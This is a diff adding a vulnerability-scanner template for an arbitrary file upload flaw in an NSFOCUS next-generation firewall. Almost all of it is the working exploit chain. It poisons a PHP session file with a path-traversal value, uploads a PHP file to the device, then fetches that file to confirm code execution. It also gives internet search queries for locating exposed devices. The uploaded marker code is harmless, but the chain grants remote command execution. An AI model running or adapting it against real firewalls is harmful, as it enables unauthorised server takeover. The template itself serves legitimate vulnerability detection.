@@ -1,0 +1,56 @@
+id: nsfocus_nf_firewall_fileupload
+
+info:
+  name: Green Alliance NF Next Generation Firewall Arbitrary File Upload Vulnerability
+  author: carrypan
+  severity: high
+  description: Green Alliance SSL VPN has an arbitrary file upload vulnerability, allowing attackers to obtain server privileges and execute remote commands by sending special request packets
+  metadata:
+    fofa-query: app="NSFOCUS-下一代防火墙"
+    hunter-query: web.title="用户认证 - NSFOCUS NF"
+  tags: nsfocus-ns
+
+http:
+  - method: POST
+    path: 
+      - "{{Host}}:8081/api/v1/device/bugsInfo"
+    headers: 
+      Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+      Content-Type: multipart/form-data; boundary=123
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+    body: |
+        --123
+        Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"
+        
+        lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
+        --123--
+   
+  - method: POST
+    path: 
+      - "{{Host}}:8081/api/v1/device/bugsInfo"
+    headers: 
+      Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+      Content-Type: multipart/form-data; boundary=123
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+    body: |
+        --123
+        Content-Disposition: form-data; name="file"; filename="compose.php"
+        
+        <?php echo '{{randstr}}';unlink(__FILE__);?>
+        --123--
+
+  - method: GET
+    path: 
+      - "{{Host}}:4433/mail/include/header_main.php"
+    headers: 
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+      Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+    #matchers-condition: and
+    
+          #- "status_code_2 == 200 && contains(body_2, 'upload file success')"
+          #- "status_code_3 == 200 && contains(body_3, '{{randstr}}')"
+        #condition: and
